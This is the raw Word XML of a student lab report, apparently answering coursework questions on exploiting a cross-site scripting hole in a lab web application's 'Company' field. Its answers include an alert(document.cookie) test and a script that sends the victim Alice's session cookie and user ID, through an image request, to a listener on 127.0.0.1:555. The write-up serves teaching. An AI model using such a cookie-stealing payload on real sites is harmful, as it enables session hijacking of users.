          <w:spacing w:val="1"/>
          <w:w w:val="83"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/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a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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t,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nj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ct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scri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st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">al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ion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kie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ot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er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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ser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iew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A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="102"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="102"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="83"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/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le</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>An</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>wer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f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
          <w:w w:val="109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q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="121"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>io</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">6.1.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was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ame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proofErr w:type="gramEnd"/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ld</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="38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v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l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spacing w:val="-2"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>XS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="93"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
          <w:w w:val="9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pacing w:val="3"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="120"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="105"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="106"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>tio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="006769F0">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="233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pt;height:233.5pt">
            <v:imagedata r:id="rId8" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="006769F0">
      <w:pPr>
        <w:spacing w:before="5" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The GUI field was “</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ompany” and the name of the variable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> used in the code</w:t>
      </w:r>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$company</w:t>
      </w:r>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006769F0" w:rsidRPr="006769F0" w:rsidRDefault="006769F0">
      <w:pPr>
        <w:spacing w:before="5" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">6.2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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was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yo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r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script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0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dis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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lay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ion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o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ie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>el</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="108"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>w?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00083ABC">
      <w:pPr>
        <w:spacing w:before="16"/>
        <w:ind w:left="20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00AD4" wp14:editId="29AC57B6">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>5059783</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>510696</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="197809" cy="164218"/>
                <wp:effectExtent l="0" t="0" r="1206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9" cy="164218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155A8" id="Oval 1" o:spid="_x0000_s1026" style="position:absolute;margin-left:398.4pt;margin-top:40.2pt;width:15.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" filled="f" strokecolor="red" strokeweight="1pt"/>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="006769F0">
        <w:pict>
          <v:shape id="_x0000_i1026" type="#_x0000_t75" style="width:333.5pt;height:181pt">
            <v:imagedata r:id="rId9" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="003F01FA">
      <w:pPr>
        <w:spacing w:before="4" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRPr="006769F0" w:rsidRDefault="006769F0">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t>The script to display the session cookie was “</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>alert(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);&lt;/script&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w: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537A8C">
      <w:pPr>
        <w:spacing w:line="280" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="159"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>6.3</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/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>[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/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39"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1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m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3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tely,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ld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al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ssion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kie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4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p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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?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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="39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ld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21"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ser </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>be?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Was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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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ces</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-23"/>
          <w:w w:val="110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spacing w:val="-2"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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ID</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="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ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>eted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ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="53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proofErr w:type="gramEnd"/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session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kie?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w w:val="113"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ove </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-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c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ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="112"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e,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ci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ld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elped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34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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="109"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="006769F0" w:rsidRDefault="006769F0" w:rsidP="006769F0">
      <w:pPr>
        <w:spacing w:line="280" w:lineRule="auto"/>
        <w:ind w:right="159"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="006769F0" w:rsidRPr="006769F0" w:rsidRDefault="006769F0" w:rsidP="006769F0">
      <w:pPr>
        <w:spacing w:line="280" w:lineRule="auto"/>
        <w:ind w:right="159"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="006769F0" w:rsidRPr="006769F0">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t>Ultimately, we wanted to steal the session cookie from the logged in user/victim, in our case Alice. Using the script “&lt;script&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>var</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> link = “”+</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.getElementsByClassName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">(“active”)[0]; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.write</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(‘&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>img</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=http://127.0.0.1:555?c=’ + escape(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">) + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>link.substr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006769F0">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>(-4) + ‘ &gt; ’);&lt;/script&gt;”</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> we  were able to include the ID of the targeted user with the stolen session cookie. </w:t>
      </w:r>
      <w:r w:rsidR="00083ABC">
        <w:rPr>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
